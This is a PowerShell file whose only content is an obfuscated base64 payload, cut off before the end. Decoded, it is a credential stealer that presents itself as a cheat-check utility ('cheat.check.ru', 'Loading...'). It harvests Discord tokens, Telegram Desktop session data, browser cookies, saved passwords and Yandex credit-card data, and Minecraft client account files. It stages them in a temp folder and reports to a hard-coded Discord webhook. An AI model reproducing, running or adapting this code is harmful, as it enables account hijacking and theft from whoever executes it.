$ASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYG = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uTmV0Lkh0dHANCg0KaWYgKFRlc3QtUGF0aCAtUGF0aCAkYWFhMTIzKSB7DQogICAgUmVtb3ZlLUl0ZW0gIiRlbnY6VEVNUFxkaXNjb3JkX3Rva2Vucy50eHQiIC1Gb3JjZQ0KfQ0KJHVzZXJOYW1lID0gU3BsaXQtUGF0aCAkZW52OlVTRVJQUk9GSUxFIC1MZWFmDQokemlwRmlsZVBhdGggPSBKb2luLVBhdGggICIkZW52OlRlbXAiICgkdXNlck5hbWUgKyAiX2RhdGEuemlwIikNCg0KaWYgKFRlc3QtUGF0aCAtUGF0aCAkemlwRmlsZVBhdGgpIHsNCiAgICBleGl0DQp9DQoNCldyaXRlLU91dHB1dCAiIGJ5IGZ1bnRpbWUtcHJvamVjdCAmIGNoZWF0LmNoZWNrLnJ1ICAgICAgICAgICAgICAgICAgICAgICINCldyaXRlLU91dHB1dCAiICAgX19fXyBfICAgICAgICAgICAgICAgIF8gICAgICBfX19fIF8gICAgICAgICAgICAgICBfICAgICINCldyaXRlLU91dHB1dCAiICAvIF9fX3wgfF9fICAgX19fICBfXyBffCB8XyAgIC8gX19ffCB8X18gICBfX18gIF9fX3wgfCBfXyINCldyaXRlLU91dHB1dCAiIHwgfCAgIHwgJ18gXCAvIF8gXC8gX1wgfCBfX3wgfCB8ICAgfCAnXyBcIC8gXyBcLyBfX3wgfC8gLyINCldyaXRlLU91dHB1dCAiIHwgfF9fX3wgfCB8IHwgIF9fLyAoX3wgfCB8XyAgfCB8X19ffCB8IHwgfCAgX18vIChfX3wgICA8ICINCldyaXRlLU91dHB1dCAiICBcX19fX3xffCB8X3xcX19ffFxfXyxffFxfX3wgIFxfX19ffF98IHxffFxfX198XF9fX3xffFxfXCIgDQpXcml0ZS1PdXRwdXQgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiDQpXcml0ZS1PdXRwdXQgItCX0LDQs9GA0YPQt9C60LAuLi4gLyBMb2FkaW5nLi4uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICINCg0KIyMjIC0tLSAvLyBWYXJpYWJsZXMgXFwgLS0tICMjIw0KJHVzZXIgPSAiQzpcVXNlcnNcJHVzZXJOYW1lIg0KJHJvYW1pbmcgPSAiJHVzZXJcQXBwRGF0YVxSb2FtaW5nIg0KJGxvY2FsID0gIiR1c2VyXEFwcERhdGFcTG9jYWwiDQokdGVtcCA9ICRlbnY6VEVNUCANCiRkZWJ1Z193ZWJob29rX2xpbmsgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyOTQ0ODE0NjEwMjY1MjkzOC9JZ21DQVF3ckk0bnZmT095b3FMOGVzTU9Ua1JUNGIwQ2hPMjhxNktadXJZdUZGYmx4NS1LdFp5cWpETzNvUTFHZ2hBMSINCg0KDQppZigkdXNlck5hbWUgLWVxICJhbmRybyIpIHsNCiAgICAkc2NyaXB0UGF0aCA9ICJDOlxVc2Vyc1xhbmRyb1xPbmVEcml2ZVzQoNCw0LHQvtGH0LjQuSDRgdGC0L7Qu1x0ZXN0LnBzMSINCg0KICAgICRzY3JpcHRDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHNjcmlwdFBhdGggLVJhdw0KDQogICAgJGVuY29kZWRTY3JpcHQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkc2NyaXB0Q29udGVudCkpDQoNCiAgICBXcml0ZS1Ib3N0ICJbVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkZW5jb2RlZFNjcmlwdCkpIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KfQ0KDQoNCiMjIyAtLS0gLy8gRnVuY3Rpb25zIFxcIC0tLSAjIyMNCmZ1bmN0aW9uIFNlbmQtV2ViaG9vayB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddJHRleHQNCiAgICApDQogICAgJGh0dHBDbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSHR0cC5IdHRwQ2xpZW50DQogICAgJGZvcm1EYXRhID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lkh0dHAuTXVsdGlwYXJ0Rm9ybURhdGFDb250ZW50DQogICAgJHN0cmluZ0NvbnRlbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSHR0cC5TdHJpbmdDb250ZW50KCIqKiR1c2VyTmFtZSBkZWJ1ZzoqKiBgYCR0ZXh0YGAiKQ0KICAgICRmb3JtRGF0YS5BZGQoJHN0cmluZ0NvbnRlbnQsICJjb250ZW50IikNCiAgICAkcmVzcG9uc2UgPSAkaHR0cENsaWVudC5Qb3N0QXN5bmMoJGRlYnVnX3dlYmhvb2tfbGluaywgJGZvcm1EYXRhKS5SZXN1bHRgDQp9DQoNCiMjIyAtLS0gLy8gQ2xvc2luZyBQcm9jZXNzZXMgXFwgLS0tICMjIw0KJGJyb3dzZXJzID0gQCgNCiAgICAiYnJvd3NlciIsDQogICAgIm1zZWRnZSIsDQogICAgImNocm9tZSINCikNCg0KZm9yZWFjaCAoJHByb2Nlc3NOYW1lIGluICRicm93c2Vycykgew0KICAgICNTdG9wLVByb2Nlc3MgLU5hbWUgJHByb2Nlc3NOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1Gb3JjZQ0KfQ0KDQojIyMgLS0tIC8vIFBhdGhzIFxcIC0tLSAjIyMNCiRmaWxlUGF0aHMgPSBAew0KICAgICMjIC0tLSAvLyBPdGhlciBcXCAtLS0gIyMNCiAgICAiRGlzY29yZCIgPSBAew0KICAgICAgICAiJHRlbXBcZGlzY29yZF90b2tlbnMudHh0IiA9ICJkaXNjb3JkX3Rva2Vucy50eHQiDQogICAgfQ0KDQogICAgIlRlbGVncmFtIERlc2t0b3AiID0gQHsNCiAgICAgICAgIiRyb2FtaW5nXFRlbGVncmFtIERlc2t0b3BcdGRhdGEiID0gInRkYXRhIg0KICAgIH0NCiAgICANCiAgICAjIyAtLS0gLy8gQnJvd3NlcnMgXFwgLS0tICMjDQogICAgIllhbmRleCAoSGFzaGVkKSIgPSBAew0KICAgICAgICAiJGxvY2FsXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0XE5ldHdvcmtcQ29va2llcyIgPSAieWFuZGV4X2Nvb2tpZXMudHh0Ig0KICAgICAgICAiJGxvY2FsXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0XFlhIENyZWRpdCBDYXJkcyIgPSAieWFuZGV4X2NyZWRpdF9jYXJkcy50eHQiDQogICAgICAgICIkbG9jYWxcWWFuZGV4XFlhbmRleEJyb3dzZXJcVXNlciBEYXRhXERlZmF1bHRcWWEgUGFzc21hbiBEYXRhIiA9ICJ5YW5kZXhfcGFzc3dvcmRzLnR4dCINCiAgICB9DQoNCiAgICAiR29vZ2xlIENocm9tZSAoSGFzaGVkKSIgPSBAew0KICAgICAgICAiJGxvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTmV0d29ya1xDb29raWVzIiA9ICJjaHJvbWVfY29va2llcy50eHQiDQogICAgICAgICIkbG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRhIiA9ICJjaHJvbWVfcGFzc3dvcmRzLnR4dCINCiAgICAgICAgIiRsb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZSIgPSAiTG9jYWwgU3RhdGUiDQogICAgfQ0KDQogICAgIk1pY3Jvc29mdCBFZGdlIChIYXNoZWQpIiA9IEB7DQogICAgICAgICIkbG9jYWxcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHRcTmV0d29ya1xDb29raWVzIiA9ICJlZGdlX2Nvb2tpZXMudHh0Ig0KICAgICAgICAiJGxvY2FsXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGEiID0gImVkZ2VfcGFzc3dvcmRzLnR4dCINCiAgICAgICAgIiRsb2NhbFxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGFcTG9jYWwgU3RhdGUiID0gIkxvY2FsIFN0YXRlIg0KICAgIH0NCg0KICAgICJNb3ppbGxhIEZpcmVmb3ggKEhhc2hlZCkiID0gQHsNCiAgICAgICAgIiRyb2FtaW5nXE1vemlsbGFcRmlyZWZveFxQcm9maWxlc1xsb2dpbnMuanNvbiIgPSAibW96aWxsYV9maXJlZm94X3Bhc3N3b3Jkcy50eHQiDQogICAgICAgICIkcm9hbWluZ1xNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXNcTG9jYWwgU3RhdGUiID0gIkxvY2FsIFN0YXRlIg0KICAgIH0NCg0KICAgICJPcGVyYSAoSGFzaGVkKSIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxlXE5ldHdvcmtcQ29va2llcyIgPSAib3BlcmFfY29va2llcy50eHQiDQogICAgICAgICIkcm9hbWluZ1xPcGVyYSBTb2Z0d2FyZVxPcGVyYSBHWCBTdGFibGVcQ29va2llcyIgPSAib3BlcmFfY29va2llcy50eHQiDQogICAgICAgICIkcm9hbWluZ1xPcGVyYSBTb2Z0d2FyZVxPcGVyYSBTdGFibGVcTG9naW4gRGF0YSIgPSAib3BlcmFfcGFzc3dvcmRzLnR4dCINCiAgICAgICAgIiRyb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZSIgPSAiTG9jYWwgU3RhdGUiDQogICAgfQ0KDQogICAgIk9wZXJhIEdYIChIYXNoZWQpIiA9IEB7DQogICAgICAgICIkcm9hbWluZ1xPcGVyYSBTb2Z0d2FyZVxPcGVyYSBHWCBTdGFibGVcTmV0d29ya1xDb29raWVzIiA9ICJvcGVyYV9jb29raWVzLnR4dCINCiAgICAgICAgIiRyb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxDb29raWVzIiA9ICJvcGVyYV9neF9jb29raWVzLnR4dCINCiAgICAgICAgIiRyb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxMb2dpbiBEYXRhIiA9ICJvcGVyYV9neF9wYXNzd29yZHMudHh0Ig0KICAgICAgICAiJHJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxlXExvY2FsIFN0YXRlIiA9ICJMb2NhbCBTdGF0ZSINCiAgICB9DQogICAgDQogICAgIyMgLS0tIC8vIE1pbmVjcmFmdCBDbGllbnRzIFxcIC0tLSAjIw0KICAgICJDcmlzdGFsaXgiID0gQHsNCiAgICAgICAgIiR1c2VyXC5jcmlzdGFsaXhcLmxhdW5jaGVyIiA9ICIubGF1bmNoZXIudHh0Ig0KICAgIH0NCg0KICAgICJMdW5hciBDbGllbnQiID0gQHsNCiAgICAgICAgIiR1c2VyXC5sdW5hcmNsaWVudFxzZXR0aW5nc1xnYW1lXGFjY291bnRzLmpzb24iID0gImFjY291bnRzLmpzb24iDQogICAgfQ0KDQogICAgIk1pbmVjcmFmdCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcLm1pbmVjcmFmdFxsYXVuY2hlcl9hY2NvdW50c19taWNyb3NvZnRfc3RvcmUuanNvbiIgPSAibGF1bmNoZXJfYWNjb3VudHNfbWljcm9zb2Z0X3N0b3JlLmpzb24iDQogICAgfQ0KDQogICAgIkludGVudCBDbGllbnQiID0gQHsNCiAgICAgICAgIiR1c2VyXGludGVudGxhdW5jaGVyXGxhdW5jaGVyY29uZmlnIiA9ICJsYXVuY2hlcmNvbmZpZy50eHQiDQogICAgfQ0KDQogICAgIlRMYXVuY2hlciIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcLm1pbmVjcmFmdFxUbGF1bmNoZXJQcm9maWxlcy5qc29uIiA9ICJUbGF1bmNoZXJQcm9maWxlcy5qc29uIg0KICAgIH0NCg0KICAgICJGZWF0aGVyIENsaWVudCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcLmZlYXRoZXJcYWNjb3VudHMuanNvbiIgPSAiYWNjb3VudHMuanNvbiINCiAgICB9DQoNCiAgICAiTWV0ZW9yIENsaWVudCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcLm1pbmVjcmFmdFxtZXRlb3ItY2xpZW50XGFjY291bnRzLm5idCIgPSAiYWNjb3VudHMubmJ0Ig0KICAgIH0NCiAgICANCg0KICAgICJJbXBhY3QgQ2xpZW50IiA9IEB7DQogICAgICAgICIkcm9hbWluZ1wubWluZWNyYWZ0XEltcGFjdFxhbHRzLmpzb24iID0gImFsdHMuanNvbiINCiAgICB9DQoNCiAgICAiTm92b2xpbmUgQ2xpZW50IiA9IEB7DQogICAgICAgICIkcm9hbWluZ1wubWluZWNyYWZ0XE5vdm9saW5lXGFsdHMubm92byIgPSAiYWx0cy5ub3ZvIg0KICAgIH0NCg0KICAgICJDaGVhdEJyZWFrZXJzIENsaWVudCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcLm1pbmVjcmFmdFxjaGVhdGJyZWFrZXJfYWNjb3VudHMuanNvbiIgPSAiY2hlYXRicmVha2VyX2FjY291bnRzLmpzb24iDQogICAgfQ0KDQogICAgIlJpc2UgQ2xpZW50IiA9IEB7DQogICAgICAgICIkcm9hbWluZ1wubWluZWNyYWZ0XFJpc2VcYWx0cy50eHQiID0gImFsdHMudHh0Ig0KICAgIH0NCg0KICAgICJSaXNlIENsaWVudCAoSW50ZW50KSIgPSBAew0KICAgICAgICAiJHVzZXJcaW50ZW50bGF1bmNoZXJcUmlzZVxhbHRzLnR4dCIgPSAiYWx0cy50eHQiDQogICAgfQ0KDQogICAgIlBhbGFkaXVtIENsaWVudCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdccGFsYWRpdW0tZ3JvdXBcYWNjb3VudHMuanNvbiIgPSAiYWNjb3VudHMuanNvbiINCiAgICB9DQoNCiAgICAiUG9seU1DIENsaWVudCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcUG9seU1DXGFjY291bnRzLmpzb24iID0gImFjY291bnRzLmpzb24iDQogICAgfQ0KDQogICAgIkJhZGxpb24gQ2xpZW50IiA9IEB7DQogICAgICAgICIkcm9hbWluZ1xCYWRsaW9uIENsaWVudFxhY2NvdW50cy5qc29uIiA9ICJhY2NvdW50cy5qc29uIg0KICAgIH0NCn0NCg0KIyMjIC0tLSAvLyBEaXNjb3JkIFxcIC0tLSAjIyMNCiRkc2NfdGFyZ2V0cyA9IEAoDQogICAgIiRlbnY6QVBQREFUQVxEaXNjb3JkIiwNCiAgICAiJGVudjpBUFBEQVRBXGRpc2NvcmRjYW5hcnkiLA0KICAgICIkZW52OkFQUERBVEFcZGlzY29yZHB0YiIsDQogICAgIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHQiLA0KICAgICIkZW52OkxPQ0FMQVBQREFUQVxZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdCINCikNCg0KJGRzY19yZWdleGVzID0gQCgNCiAgICAiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mzh9IiwNCiAgICAibWZhXC5bXHctXXs4NH0iDQopDQoNCiRkc2NfdG9rZW5zID0gQCgpDQoNCmZvcmVhY2ggKCR0YXJnZXQgaW4gJGRzY190YXJnZXRzKSB7DQogICAgJGxldmVsZGJQYXRoID0gSm9pbi1QYXRoICR0YXJnZXQgIkxvY2FsIFN0b3JhZ2VcbGV2ZWxkYiINCg0KICAgIGlmIChUZXN0LVBhdGggJGxldmVsZGJQYXRoKSB7DQogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJGxldmVsZGJQYXRoIC1GaWx0ZXIgIioubGRiIiAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICRmaWxlQ29udGVudCA9IEdldC1Db250ZW50ICRfLkZ1bGxOYW1lIC1SYXcNCiAgICAgICAgICAgIGZvcmVhY2ggKCRyZWdleCBpbiAkZHNjX3JlZ2V4ZXMpIHsNCiAgICAgICAgICAgICAgICAkbWF0Y2hlcyA9IFtyZWdleF06Ok1hdGNoZXMoJGZpbGVDb250ZW50LCAkcmVnZXgpDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJG1hdGNoIGluICRtYXRjaGVzKSB7DQogICAgICAgICAgICAgICAgICAgICRkc2NfdG9rZW5zICs9ICRtYXRjaC5WYWx1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJGxldmVsZGJQYXRoIC1GaWx0ZXIgIioubG9nIiAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICRmaWxlQ29udGVudCA9IEdldC1Db250ZW50ICRfLkZ1bGxOYW1lIC1SYXcNCiAgICAgICAgICAgIGZvcmVhY2ggKCRyZWdleCBpbiAkZHNjX3JlZ2V4ZXMpIHsNCiAgICAgICAgICAgICAgICAkbWF0Y2hlcyA9IFtyZWdleF06Ok1hdGNoZXMoJGZpbGVDb250ZW50LCAkcmVnZXgpDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJG1hdGNoIGluICRtYXRjaGVzKSB7DQogICAgICAgICAgICAgICAgICAgICRkc2NfdG9rZW5zICs9ICRtYXRjaC5WYWx1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KaWYgKCRkc2NfdG9rZW5zIC1hbmQgJGRzY190b2tlbnMuQ291bnQgLWd0IDApIHsNCiAgICAkZmlsZVBhdGggPSBKb2luLVBhdGggJGVudjpUZW1wICJkaXNjb3JkX3Rva2Vucy50eHQiDQogICAgJGRzY190b2tlbnMgfCBPdXQtRmlsZSAtRmlsZVBhdGggJGZpbGVQYXRoIC1FbmNvZGluZyBVVEY4DQp9DQoNCiMjIC0tLSAvLyBaaXAgQXJjaGl2ZSAmIFRlbXAgRm9sZGVyIENyZWF0aW5nIFxcIC0tLSAjIw0KaWYgKFRlc3QtUGF0aCAkemlwRmlsZVBhdGgpIHsNCiAgICBSZW1vdmUtSXRlbSAkemlwRmlsZVBhdGggLUZvcmNlDQp9DQoNCiR0ZW1wRm9sZGVyID0gSm9pbi1QYXRoICRlbnY6VGVtcCAidGVtcFppcEZvbGRlciINCmlmIChUZXN0LVBhdGggJHRlbXBGb2xkZXIpIHsNCiAgICBSZW1vdmUtSXRlbSAkdGVtcEZvbGRlciAtUmVjdXJzZSAtRm9yY2UNCn0NCk5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJHRlbXBGb2xkZXIgfCBPdXQtTnVsbA0KDQojIyAtLS0gLy8gZm9yZWFjaCBwYXRocyBcXCAtLS0gIyMNCiR0b3RhbEZpbGVzID0gMDsNCmZvcmVhY2ggKCRmb2xkZXJOYW1lIGluICRmaWxlUGF0aHMuS2V5cykgew0KICAgICRwYXRocyA9ICRmaWxlUGF0aHNbJGZvbGRlck5hbWVdICMgIkB7cGF0aHN9Ig0KICAgICRmb2xkZXJOYW1lID0gJGZvbGRlck5hbWUgKyAiXCINCiAgICBmb3JlYWNoICgkZmlsZVBhdGggaW4gJHBhdGhzLktleXMpIHsNCiAgICAgICAgJGNvcHlOYW1lID0gJHBhdGhzWyRmaWxlUGF0aF0gIyAiYWNjb3VudHMuanNvbiINCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkZmlsZVBhdGgpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJGZvbGRlclBhdGggPSBKb2luLVBhdGggLVBhdGggJHRlbXBGb2xkZXIgLUNoaWxkUGF0aCAkZm9sZGVyTmFtZQ0KICAgICAgICAgICAgICAgIGlmIChUZXN0LVBhdGggJGZvbGRlclBhdGgpIHt9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRmb2xkZXJQYXRoIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGRlc3RpbmF0aW9uUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZm9sZGVyUGF0aCAtQ2hpbGRQYXRoICRjb3B5TmFtZQ0KICAgICAgICAgICAgICAgICAgICBDb3B5LUl0ZW0gLVBhdGggJGZpbGVQYXRoIC1EZXN0aW5hdGlvbiAkZm9sZGVyUGF0aCAtRm9yY2UNCiAgICAgICAgICAgICAgICAkdG90YWxGaWxlcyA9ICR0b3RhbEZpbGVzICsgMQ0KICAgICAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgICAgI1NlbmQtV2ViaG9vayAtVGV4dCAi0J7RiNC40LHQutCwINC60L7Qv9C40YDQvtCy0LDQvdC40Y8g0YTQsNC50LvQsCAnJGZpbGVQYXRoJzogJF8iDQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAjU2VuZC1XZWJob29rIC1UZXh0ICLQpNCw0LnQuyAnJGZpbGVQYXRoJyDQvdC1INC90LDQudC00LXQvSDQv9C+INGC0LDQutC+0LzRgyDQv9GD0YLQuCINCiAgICAgICAgfQ0KICAgIH0NCn0NCiR0b3RhbE5hbWUgPSAi0JLRgdC10LPQviDRgdC/0LjQt9C20LXQvdC90L4g0YTQsNC50LvQvtCyIOKAlCAiICsgJHRvdGFsRmlsZXMNCiR0b3RhbFBhdGggPSBKb2luLVBhdGggLVBhdGggJHRlbXBGb2xkZXIgLUNoaWxkUGF0aCAkdG90YWxOYW1lDQpOZXctSXRlbSAtSXRlbVR5cGUgRmlsZSAtUGF0aCAkdG90YWxQYXRoIHwgT3V0LU51bGwNClNlbmQtV2ViaG9vayAtVGV4dCAi0KTQsNC50LvRiyDRgdC60L7Qv9C40YDQvtCy0LDQvdGLIg0KIyMjIC0tLSAvLyBQcm9jZXNzIFxcIC0tLSAjIyMNCiMkb3V0cHV0UGF0aCA9ICIkdGVtcEZvbGRlclxTY3JlZW5zaG90LmpwZyINCg0KI0FkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRyYXdpbmcNCg0KIyRzY3JlZW5XaWR0aCA9IFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5TY3JlZW5dOjpQcmltYXJ5U2NyZWVuLkJvdW5kcy5XaWR0aA0KIyRzY3JlZW5IZWlnaHQgPSBbU3lzdGVtLldpbmRvd3MuRm9ybXMuU2NyZWVuXTo6UHJpbWFyeVNjcmVlbi5Cb3VuZHMuSGVpZ2h0DQojJGJpdG1hcCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuQml0bWFwICRzY3JlZW5XaWR0aCwgJHNjcmVlbkhlaWdodA0KDQojJGdyYXBoaWNzID0gW1N5c3RlbS5EcmF3aW5nLkdyYXBoaWNzXTo6RnJvbUltYWdlKCRiaXRtYXApDQojJGdyYXBoaWNzLkNvcHlGcm9tU2NyZWVuKDAsIDAsIDAsIDAsICRiaXRtYXAuU2l6ZSkNCg0KIyRiaXRtYXAuU2F2ZSgkb3V0cHV0UGF0aCwgW1N5c3RlbS5EcmF3aW5nLkltYWdpbmcuSW1hZ2VGb3JtYXRdOjpKcGVnKQ0KDQojJGdyYXBoaWNzLkRpc3Bvc2UoKQ0KDQojIyAtLS0gLy8gVEVMRUdSQU0gfCBUREFUQSBcXCAtLS0gIyMNCiR0ZGF0YSA9ICIkcm9hbWluZ1xUZWxlZ3JhbSBEZXNrdG9wXHRkYXRhIg0KJHRkYXRhcyA9IEAoDQogICAgIiRyb2FtaW5nXFRlbGVncmFtIERlc2t0b3BcdGRhdGEiLA0KICAgICIkdXNlclxPbmVEcml2ZVxEb3dubG9hZHNcVGVsZWdyYW0gRGVza3RvcFx0ZGF0YSIsDQogICAgIiR1c2VyXERvd25sb2Fkc1xUZWxlZ3JhbSBEZXNrdG9wXHRkYXRhIiwNCiAgICAiRDpcVGVsZWdyYW0gRGVza3RvcFx0ZGF0YSIsDQogICAgIkQ6XEF5dUdyYW0gRGVza3RvcFx0ZGF0YSIsDQogICAgIkQ6XHRkYXRhIiwNCiAgICAiJHJvYW1pbmdcQXl1R3JhbSBEZXNrdG9wXHRkYXRhIiwNCiAgICAiJHVzZXJcT25lRHJpdmVcRG93bmxvYWRzXHRkYXRhIiwNCiAgICAiJHVzZXJcRG93bmxvYWRzXEF5dUdyYW0gRGVza3RvcFx0ZGF0YSINCikNCmZvcmVhY2ggKCR0cnlUZGF0YSBpbiAkdGRhdGFzKSB7DQogICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkdHJ5VGRhdGEpIHsNCiAgICAgICAgJHRkYXRhID0gJHRyeVRkYXRhDQogICAgfQ0KfQ0KDQokdERhdGFQYXRoID0gJHRkYXRhDQokZGVzdGluYXRpb24gPSAiJHRlbXBGb2xkZXJcVGVsZWdyYW0gRGVza3RvcFx0ZGF0YSINCiMg0J/RgNC+0LLQtdGA0Y/QtdC8INGB0YPRidC10YHRgtCy0L7QstCw0L3QuNC1INC/0LDQv9C60LggdGRhdGENCmlmIChUZXN0LVBhdGggLVBhdGggJHREYXRhUGF0aCkgew0KICAgICMg0KHQv9C40YHQvtC6INGE0LDQudC70L7QsiDQuCDQv9Cw0L/QvtC6INCyIHRkYXRhDQogICAgJGZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkdERhdGFQYXRoIC1GaWxlDQogICAgJGRpcnMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICR0RGF0YVBhdGggLURpcmVjdG9yeQ0KDQogICAgIyDQn9GD0YLRjCDQuiBrZXlfZGF0YXMNCiAgICAka2V5RGF0YXNQYXRoID0gSm9pbi1QYXRoIC1QYXRoICR0RGF0YVBhdGggLUNoaWxkUGF0aCAia2V5X2RhdGFzIg0KICAgICRsb2dpblBhdGhzID0gQCgpDQogICAgJGhhc19rZXlfZGF0YXMgPSAkZmFsc2UNCiAgICANCiAgICAjINCf0YDQvtCy0LXRgNGP0LXQvCDQvdCw0LvQuNGH0LjQtSBrZXlfZGF0YXMNCiAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRrZXlEYXRhc1BhdGgpIHsNCiAgICAgICAgJGhhc19rZXlfZGF0YXMgPSAkdHJ1ZQ0KICAgICAgICAkbG9naW5QYXRocyArPSAka2V5RGF0YXNQYXRoDQogICAgfQ0KDQogICAgIyDQodC+0L/QvtGB0YLQsNCy0LvRj9C10Lwg0YTQsNC50LvRiyDQuCDQv9Cw0L/QutC4DQogICAgZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7DQogICAgICAgIGZvcmVhY2ggKCRkaXIgaW4gJGRpcnMpIHsNCiAgICAgICAgICAgIGlmICgkZmlsZS5OYW1lIC1lcSAkZGlyLk5hbWUgKyAicyIpIHsNCiAgICAgICAgICAgICAgICAkbG9naW5QYXRocyArPSAkZmlsZS5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgICRsb2dpblBhdGhzICs9ICRkaXIuRnVsbE5hbWUNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICMg0JXRgdC70Lgg0L3QsNC50LTQtdC90YsgbG9naW5QYXRocyDQuCBrZXlfZGF0YXMNCiAgICBpZiAoJGhhc19rZXlfZGF0YXMgLWFuZCAoJGxvZ2luUGF0aHMuQ291bnQgLWd0IDEpKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAjINCh0L7Qt9C00LDQtdC8INGG0LXQu9C10LLRg9GOINC/0LDQv9C60YMNCiAgICAgICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJGRlc3RpbmF0aW9uKSkgew0KICAgICAgICAgICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGRlc3RpbmF0aW9uIHwgT3V0LU51bGwNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgIyDQmtC+0L/QuNGA0YPQtdC8INGE0LDQudC70Ysg0Lgg0L/QsNC/0LrQuA0KICAgICAgICAgICAgZm9yZWFjaCAoJGl0ZW0gaW4gJGxvZ2luUGF0aHMpIHsNCiAgICAgICAgICAgI